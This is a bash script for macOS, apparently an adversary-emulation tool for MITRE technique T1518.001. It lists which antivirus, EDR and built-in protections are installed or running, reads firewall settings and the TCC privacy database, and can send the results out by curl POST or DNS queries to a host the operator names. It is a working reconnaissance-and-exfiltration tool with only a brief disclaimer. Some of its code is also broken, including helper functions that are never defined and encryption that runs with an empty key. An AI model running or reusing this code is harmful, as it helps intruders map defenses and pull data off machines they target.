#!/bin/bash

#Name: securitysofware.sh
# TTP: Security Software Discovery
# TTP ID: T1518.001
# Tactic: Discovery
# Platform: macOS
# Permissions Required: User
# Author: @darmado x.com/darmad0
# Date: 2024-09-22
# Version: 1.0

# Description: This script discovers security software installed on a macOS system,
# including antivirus, firewall, and other security tools. It checks for running
# processes, installed applications, and system configurations related to security
# software.

# Usage: ./securitysoftware.sh [options]
# Options:
#   -c, --check          Execute security software check
#   -v, --verbose        Enable verbose output
#   -l, --log            Enable logging to file
#   --encode=TYPE        Encode output (b64, hex)
#   --encrypt=KEY        Encrypt output with provided key
#   --exfil=http://URL   Exfiltrate output to specified URL
#   --exfil=dns=DOMAIN   Exfiltrate output via DNS to specified domain

# Note: This script is intended for educational and authorized testing purposes only.
# Ensure you have proper permissions before running on any system.

# Global variables
NAME="security_software_discovery"
TTP_ID="T1518.001"
LOG_FILE="${TTP_ID}_${NAME}.log"
VERBOSE=false
LOG_ENABLED=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""
CHECK=false

security_tools() {
    local total_checks=0
    local installed_tools=0
    local active_tools=0

    # List process names to check
    local process_names=(
      "SentinelAgent" "falconctl" "CbOsxSensorService" "SophosScanD" "CylanceSvc"
      "mfetpd" "iCoreService" "eset_daemon" "kav" "bdservicehost" "XProtectService"
      "MRT" "com.apple.security.syspolicyd" "com.apple.trustd" "com.avast.daemon"
      "NortonSecurity" "WebrootSecureAnywhere" "f-secure" "Malwarebytes" "cyserver"
      "xagt" "SophosHome" "Avira" "VirusBarrier" "F-Secure-Safe" "McAfeeSecurity"
      "Symantec" "wdav" "kesl" "LuLu" "DoNotDisturb" "BlockBlock" "RansomWhere"
      "KnockKnock" "OverSight" "WhatsYourSign"
    )

    # List vendor file paths to check
    local vendor_files=(
      "/Applications/SentinelOne.app" "/Library/CS/falconctl"
      "/Applications/CarbonBlack/CbOsxSensorService" "/Library/Sophos Anti-Virus"
      "/Library/Application Support/Cylance/Desktop/CylanceUI.app" "/usr/local/McAfee"
      "/Library/Application Support/TrendMicro"
      "/Library/Application Support/com.eset.remoteadministrator.agent"
      "/Library/Application Support/Kaspersky" "/Applications/LuLu.app"
      "/Applications/DoNotDisturb.app" "/Applications/BlockBlock.app"
      "/Applications/RansomWhere.app" "/Applications/KnockKnock.app"
      "/Applications/OverSight.app" "/Applications/WhatsYourSign.app"
    )

    local output=""

    # Check running security tool processes
    for process in "${process_names[@]}"; do
        total_checks=$((total_checks+1))
        if pgrep -f "$process" > /dev/null; then
            active_tools=$((active_tools+1))
            output+="ALERT - Active security tool found: $process\n"
            output+="Details:\n$(ps aux | grep -i "$process" | grep -v grep)\n\n"
        fi
    done

    # Check vendor-installed applications
    for file in "${vendor_files[@]}"; do
        total_checks=$((total_checks+1))
        if [ -d "$file" ]; then
            output+="WARN - Security tool installed: $file\n"
            installed_tools=$((installed_tools+1))
        fi
    done

    # Check macOS built-in security tools
    if spctl --status | grep -q enabled; then
        output+="ALERT - Gatekeeper is enabled\n"
        active_tools=$((active_tools+1))
        output+="Gatekeeper Configuration:\n$(spctl --assess --verbose /Applications/Safari.app)\n\n"
    fi

    # Check Firewall configuration
    if [ "$(defaults read /Library/Preferences/com.apple.alf globalstate)" == "1" ]; then
        if check_permissions "/Library/Preferences/com.apple.alf.plist" "r"; then
            output+="ALERT - Firewall is enabled\n"
            active_tools=$((active_tools+1))
            output+="Firewall Configuration:\n"
            output+="$(sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate)\n"
            output+="$(sudo /usr/libexec/ApplicationFirewall/socketfilterfw --listapps)\n\n"
        fi
    fi

    # Check XProtect configuration
    if pgrep XProtectService > /dev/null; then
        if check_permissions "/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.meta.plist" "r"; then
            output+="ALERT - XProtect is running\n"
            active_tools=$((active_tools+1))
            output+="XProtect Configuration:\n"
            output+="$(defaults read /System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.meta.plist)\n\n"
        fi
    fi

    # Check MRT configuration
    if pgrep MRT > /dev/null; then
        if check_permissions "/System/Library/CoreServices/MRT.app/Contents/Info.plist" "r"; then
            output+="ALERT - Malware Removal Tool (MRT) is running\n"
            active_tools=$((active_tools+1))
            output+="MRT Configuration:\n"
            output+="$(defaults read /System/Library/CoreServices/MRT.app/Contents/Info.plist)\n\n"
        fi
    fi

    # Check TCC configuration
    if pgrep syspolicyd > /dev/null; then
        if check_permissions "/Library/Application Support/com.apple.TCC/TCC.db" "r"; then
            output+="ALERT - TCC (Transparency, Consent, and Control) is active\n"
            active_tools=$((active_tools+1))
            output+="TCC Configuration:\n"
            output+="$(sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "SELECT client, service, allowed, prompt_count FROM access")\n\n"
        fi
    fi

    output+="INFO - Total checks: $total_checks, Installed tools: $installed_tools, Active tools: $active_tools\n"
    echo -e "$output"
}

encode_output() {
    local output=$1
    case $ENCODE in
        b64|base64)
            echo "$output" | base64
            ;;
        hex)
            echo "$output" | xxd -p
            ;;
        *)
            echo "$output"
            ;;
    esac
}

exfiltrate_http() {
    local data="$1"
    local uri="$2"
    curl -X POST -d "$data" "$uri"
}

exfiltrate_dns() {
    local data="$1"
    local uri="$2"
    for chunk in $(echo "$data" | fold -w 63); do
        dig @"$uri" "$chunk.example.com"
    done
}

main() {
    if [ "$CHECK" = true ]; then
        local raw_output=$(security_tools)
        local processed_output=""

        if [ -n "$raw_output" ]; then
            processed_output=$(encode_output "$raw_output")
            if [ -n "$ENCRYPT" ]; then
                processed_output=$(echo "$processed_output" | openssl enc -aes-256-cbc -a -salt -pass pass:"$ENCRYPT_KEY")
            fi
            if [ "$EXFIL" = true ]; then
                if [ "$EXFIL_METHOD" = "http" ]; then
                    exfiltrate_http "$processed_output" "$EXFIL_URI"
                elif [ "$EXFIL_METHOD" = "dns" ]; then
                    exfiltrate_dns "$processed_output" "$EXFIL_URI"
                fi
            else
                echo "$processed_output"
            fi
        else
            log "No security software information found"
        fi
    else
        echo "Use -c or --check to execute the security software check."
    fi
}

# Parse command line arguments
while [ "$#" -gt 0 ]; do
    case "$1" in
        -v|--verbose) VERBOSE=true ;;
        -l|--log) LOG_ENABLED=true ;;
        --encode=*) ENCODE="${1#*=}" ;;
        --encrypt=*) 
            ENCRYPT="aes-256-cbc"
            ENCRYPT_KEY="${1#*=}"
            ;;
        --exfil=*)
            EXFIL=true
            EXFIL_METHOD="${1#*=}"
            if [[ "$EXFIL_METHOD" == dns=* ]]; then
                EXFIL_METHOD="dns"
                EXFIL_URI="${1#*=dns=}"
            else
                EXFIL_METHOD="http"
                EXFIL_URI="${1#*=}"
            fi
            ;;
        -c|--check) CHECK=true ;;
        *) echo "Unknown option: $1" >&2; exit 1 ;;
    esac
    shift
done

main
